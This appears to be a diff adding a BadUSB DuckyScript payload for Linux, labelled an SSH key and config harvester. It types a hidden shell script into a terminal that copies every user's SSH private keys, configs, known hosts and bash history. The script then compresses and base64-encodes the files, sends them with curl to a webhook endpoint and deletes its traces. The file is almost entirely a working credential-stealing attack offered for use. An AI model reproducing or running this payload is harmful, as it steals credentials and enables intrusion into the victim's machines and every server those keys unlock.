@@ -1,0 +1,71 @@
+REM NullSec - Linux SSH Key and Config Harvester
+REM For Linux targets via BadUSB
+REM Extracts SSH keys, configs, known hosts
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Create exfil script
+STRING cat > /tmp/.n01d.sh << 'SCRIPT'
+#!/bin/bash
+OUT="/tmp/.ssh_harvest_$(date +%s)"
+mkdir -p "$OUT"
+
+# Find all SSH keys
+for user_home in /home/* /root; do
+    if [ -d "$user_home/.ssh" ]; then
+        user=$(basename "$user_home")
+        mkdir -p "$OUT/$user"
+        
+        # Copy private keys
+        cp "$user_home/.ssh/id_"* "$OUT/$user/" 2>/dev/null
+        cp "$user_home/.ssh/*_rsa" "$OUT/$user/" 2>/dev/null
+        cp "$user_home/.ssh/*_ed25519" "$OUT/$user/" 2>/dev/null
+        cp "$user_home/.ssh/*_ecdsa" "$OUT/$user/" 2>/dev/null
+        
+        # Copy configs
+        cp "$user_home/.ssh/config" "$OUT/$user/" 2>/dev/null
+        cp "$user_home/.ssh/known_hosts" "$OUT/$user/" 2>/dev/null
+        cp "$user_home/.ssh/authorized_keys" "$OUT/$user/" 2>/dev/null
+    fi
+done
+
+# System SSH config
+cp /etc/ssh/ssh_config "$OUT/" 2>/dev/null
+cp /etc/ssh/sshd_config "$OUT/" 2>/dev/null
+
+# SSH agent sockets
+find /tmp -name "agent.*" -o -name "ssh-*" 2>/dev/null > "$OUT/agent_sockets.txt"
+
+# Recent SSH connections from bash history
+for hist in /home/*/.bash_history /root/.bash_history; do
+    grep -E "ssh |scp |sftp " "$hist" 2>/dev/null >> "$OUT/ssh_history.txt"
+done
+
+# Compress
+cd /tmp
+tar -czf ".harvest.tar.gz" "$(basename $OUT)" 2>/dev/null
+
+# Base64 for exfil
+base64 -w0 /tmp/.harvest.tar.gz > /tmp/.harvest.b64
+
+# Exfil via curl (change endpoint)
+curl -s -X POST -d @/tmp/.harvest.b64 "https://webhook.site/YOUR-ID" 2>/dev/null
+
+# Cleanup
+rm -rf "$OUT" /tmp/.harvest.* /tmp/.n01d.sh
+SCRIPT
+ENTER
+DELAY 200
+
+STRING chmod +x /tmp/.n01d.sh && /tmp/.n01d.sh &
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
